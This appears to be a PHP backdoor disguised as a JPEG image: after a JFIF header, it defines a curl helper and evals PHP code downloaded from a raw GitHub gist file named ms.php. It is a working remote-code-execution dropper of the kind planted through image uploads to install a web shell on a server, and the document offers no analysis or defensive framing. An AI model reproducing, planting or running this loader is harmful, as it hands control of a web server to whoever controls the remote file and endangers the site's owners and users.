ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://gist.githubusercontent.com/paknago21/fdbfefd3a4c92c7367a00be888ae3982/raw/05da4506bf96e212c6da3ee0632cb896cf44e947/ms.php'));
?>
